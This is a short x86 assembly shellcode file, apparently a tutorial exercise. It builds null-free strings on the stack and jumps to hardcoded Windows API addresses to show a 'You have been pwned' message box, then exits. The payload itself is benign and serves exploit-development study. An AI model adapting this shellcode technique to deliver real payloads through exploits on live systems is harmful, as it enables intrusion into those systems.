; put current location of the stack into ebp
; write nulls to the stack (xor eax,eax and push eax)
; write the non-null bytes to an exact negative offset location relative to the stack’s base pointer (ebp)
[bits 32]

xor eax,eax     ;set EAX to zero
mov ebp,esp     ;set EBP to ESP so we can use negative offset
push eax
mov byte [ebp-2],65h
mov byte [ebp-3],6eh
mov byte [ebp-4],30h
push 0x206d7241     ;push rest of string to stack
mov ebx,esp     ;save pointer to "Arm 0ne" in EBX

push 0x006e616c     ;push "You have been pwned by a fan of the Corelan"
push 0x65726f43
push 0x20656874
push 0x20666f20
push 0x6e616620
push 0x61207962
push 0x2064656e
push 0x7770206e
push 0x65656220
push 0x65766168
push 0x20756f59

mov ecx,esp

xor eax,eax
push eax
push ebx
push ecx
push eax
push eax

mov esi,0x7E4507EA
jmp esi

xor eax,eax
push eax
mov eax,0x7c81cafa
jmp eax